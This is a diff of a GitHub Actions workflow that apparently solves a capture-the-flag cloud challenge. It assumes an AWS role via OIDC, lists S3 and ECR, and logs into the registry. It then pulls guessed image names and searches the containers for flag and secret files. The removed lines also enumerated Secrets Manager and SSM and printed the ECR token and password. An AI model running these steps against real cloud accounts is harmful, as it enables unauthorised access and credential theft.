@@ -1,4 +1,4 @@
-name: Explore AWS Permissions & ECR
+name: Explore AWS ECR & Containers
 
 on:
   workflow_dispatch:
@@ -8,8 +8,7 @@ permissions:
   contents: read
 
 jobs:
-  assume-role:
-    name: Assume role and explore
+  assume-and-explore:
     runs-on: ubuntu-latest
     env:
       AWS_REGION: us-east-1
@@ -18,78 +17,27 @@ jobs:
       - name: Checkout repo
         uses: actions/checkout@v4
 
-      - name: Configure AWS credentials (assume role via OIDC)
+      - name: Configure AWS credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
           aws-region: us-east-1
 
-      - name: Show caller identity
-        run: |
-          echo "=== Caller identity ==="
-          aws sts get-caller-identity || true
+      - name: Check current AWS identity
+        run: aws sts get-caller-identity
 
-      - name: Basic environment & workflow files
+      - name: Attempt S3, ECR, and Docker exploration
         run: |
-          echo "=== ENV related to AWS/OIDC ==="
-          env | grep -i aws || true
-          echo "=== Workflow dir listing ==="
-          pwd
-          ls -la
-
-      - name: Try a few read-ish AWS operations (best-effort)
-        run: |
-          set -euo pipefail || true
-          echo "=== Checking S3 ==="
+          echo "=== Checking S3 buckets ==="
           aws s3 ls || echo "No S3 list access"
-          echo "=== Checking Secrets Manager ==="
-          aws secretsmanager list-secrets --max-results 10 || echo "No Secrets Manager access"
-          echo "=== Checking SSM Parameters ==="
-          aws ssm describe-parameters --max-results 10 || echo "No SSM access"
-          echo "=== Checking CloudFormation ==="
-          aws cloudformation list-stacks --max-results 10 || echo "No CloudFormation access"
-          echo "=== Describe ECR repos (us-east-1) ==="
-          aws ecr describe-repositories --region us-east-1 || echo "No ECR describe access"
 
-      - name: Get ECR auth token & login (best-effort)
-        id: ecr_login
-        run: |
-          set -euo pipefail || true
-          REGION=us-east-1
-          # Try to get auth token
-          auth_json="$(aws ecr get-authorization-token --region "$REGION" --output json 2>/dev/null || echo '{}')"
-          echo "raw auth_json: $auth_json"
-          proxy="$(echo "$auth_json" | jq -r '.authorizationData[0].proxyEndpoint // empty')"
-          token="$(echo "$auth_json" | jq -r '.authorizationData[0].authorizationToken // empty')"
-          if [ -n "$token" ]; then
-            decoded="$(echo "$token" | base64 --decode 2>/dev/null || true)"
-            password="$(echo "$decoded" | awk -F: '{print $2}')"
-            echo "proxy=$proxy" >> ecr_output.env
-            echo "password_present=$( [ -n \"$password\" ] && echo true || echo false )" >> ecr_output.env
-            echo "::set-output name=has_token::true"
-            echo "::set-output name=proxy::$proxy"
-            echo "::set-output name=password::$password"
-            # login (ignore failures)
-            echo "$password" | docker login --username AWS --password-stdin "${proxy}" || echo "docker login failed"
-          else
-            echo "No ECR token available (permission missing?)." > ecr_output.env
-            echo "::set-output name=has_token::false"
-          fi
-        shell: bash
+          echo "=== Describe ECR repositories ==="
+          aws ecr describe-repositories --region $AWS_REGION || echo "No ECR repos"
 
-      - name: Describe repositories and save list
-        run: |
-          set -euo pipefail || true
-          REGION=us-east-1
-          aws ecr describe-repositories --region "$REGION" --output json > repos.json 2>/dev/null || echo '{"repositories":[]}' > repos.json
-          echo "Saved repos.json"
-        shell: bash
+          echo "=== Get ECR auth token ==="
+          aws ecr get-login-password --region $AWS_REGION | docker login --username AWS --password-stdin 396961015104.dkr.ecr.$AWS_REGION.amazonaws.com
 
-      - name: Try Phrase-Based Names
-        run: |
-          set -euo pipefail || true
-          echo "=== Trying phrases from the description ==="
-
+          echo "=== Trying common phrase-based Docker images ==="
           PHRASES=(
             "never-imagined" "never_imagined" "i-never-imagined"
             "misconfigure-cloud" "misconfigured-cloud" "cloud-misconfiguration"
@@ -101,28 +49,15 @@ jobs:
             "be-careful" "careful-oidc" "oidc-careful"
           )
 
-          REGISTRY="${ECR_REGISTRY:-396961015104.dkr.ecr.us-east-1.amazonaws.com}"
-
           for phrase in "${PHRASES[@]}"; do
             echo "Trying: $phrase"
-            image="$REGISTRY/$phrase:latest"
-            if docker pull "$image" 2>/dev/null; then
-              echo "🎉 FOUND: $image"
-              docker images | grep "$phrase" || true
-              echo "=== Checking container contents (short probe) ==="
-              docker run --rm "$image" sh -c 'find / -maxdepth 3 -type f -name "*flag*" -o -name "*secret*" -o -name "*.txt" 2>/dev/null | head -n 30' || true
-              # stop after first successful discovery
+            if docker pull 396961015104.dkr.ecr.$AWS_REGION.amazonaws.com/$phrase:latest 2>/dev/null; then
+              echo "🎉 FOUND: $phrase"
+              docker images | grep $phrase
+              echo "=== Exploring container contents ==="
+              docker run --rm 396961015104.dkr.ecr.$AWS_REGION.amazonaws.com/$phrase:latest \
+                sh -c 'find / -name "*flag*" -o -name "*secret*" -o -name "*.txt" 2>/dev/null | head -20' || \
+              docker run --rm 396961015104.dkr.ecr.$AWS_REGION.amazonaws.com/$phrase:latest env | grep -i flag
               break
-            else
-              echo "Not present or not allowed: $image"
             fi
           done
-        shell: bash
-        timeout-minutes: 10
-
-      - name: Upload repos.json artifact
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: ecr-repos-json
-          path: repos.json
